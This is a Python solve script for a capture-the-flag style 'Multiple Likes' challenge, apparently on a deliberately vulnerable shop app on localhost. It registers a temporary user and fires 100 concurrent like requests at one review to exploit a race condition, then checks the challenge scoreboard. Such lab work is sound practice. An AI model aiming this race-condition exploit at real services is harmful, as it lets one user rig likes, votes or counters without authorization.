import requests
import concurrent.futures
import time
import random
import string
import json

BASE_URL = "http://localhost:3000"

def random_string(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

def register_and_login():
    email = f"likes_{random_string()}@test.com"
    password = "password123"
    
    # Register
    reg_payload = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1, "answer": "admin123"},
        "username": email.split("@")[0]
    }
    try:
        r = requests.post(f"{BASE_URL}/api/Users", json=reg_payload, timeout=5)
    except Exception as e:
        print(f"[-] Registration Exception: {e}")
        return None

    # Login
    try:
        r = requests.post(f"{BASE_URL}/rest/user/login", json={"email": email, "password": password}, timeout=5)
        if r.status_code != 200:
            print(f"[-] Login failed: {r.text}")
            return None
        return r.json()['authentication']['token']
    except Exception as e:
        print(f"[-] Login Exception: {e}")
        return None

def get_target_review(token):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    # Get reviews for product 1
    try:
        r = requests.get(f"{BASE_URL}/rest/products/1/reviews", timeout=5)
        reviews = r.json().get("data", [])
        
        if reviews:
            print(f"[*] Found {len(reviews)} existing reviews.")
            return reviews[0]["_id"]
        
        # If no reviews, create one on product 1
        print("[*] No reviews found, creating one...")
        review_payload = {
            "message": "Nice product!",
            "author": "anonymous" 
        }
        # Correct endpoint for creating review might be PUT /rest/products/{id}/reviews
        r = requests.put(f"{BASE_URL}/rest/products/1/reviews", headers=headers, json=review_payload, timeout=5)
        if r.status_code == 201 or r.status_code == 200:
            # Fetch again to get ID
            r = requests.get(f"{BASE_URL}/rest/products/1/reviews", timeout=5)
            reviews = r.json().get("data", [])
            if reviews:
                return reviews[0]["_id"]
    except Exception as e:
        print(f"[-] Error fetching/creating review: {e}")
            
    print("[-] Failed to find or create a review.")
    return None

def solve_multiple_likes():
    print("[*] Registering temporary user...")
    token = register_and_login()
    if not token:
        return

    review_id = get_target_review(token)
    if not review_id:
        return
        
    print(f"[*] Targeting Review ID: {review_id}")
    
    url = f"{BASE_URL}/rest/products/reviews/{review_id}/like"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    def send_like():
        try:
            # The challenge is to like the SAME review multiple times with the SAME user.
            r = requests.post(url, headers=headers, timeout=5)
            return r.status_code
        except Exception as e:
            return 0
            
    print("[*] Starting Race Condition for Multiple Likes...")
    # High concurrency
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(send_like) for _ in range(100)]
        results = [f.result() for f in futures]
        
    successes = results.count(200)
    print(f"[*] Request Results (first 20): {results[:20]}...")
    print(f"[*] Successful Likes: {successes}")
    
    # Verify
    try:
        r = requests.get(f"{BASE_URL}/api/Challenges", timeout=5)
        challenges = r.json().get("data", [])
        for c in challenges:
            if c['key'] == 'timingAttackChallenge':
                print(f"[*] 'Multiple Likes' (timingAttackChallenge) Solved: {c['solved']}")
    except Exception as e:
        print(f"[-] Verification failed: {e}")

if __name__ == "__main__":
    solve_multiple_likes()
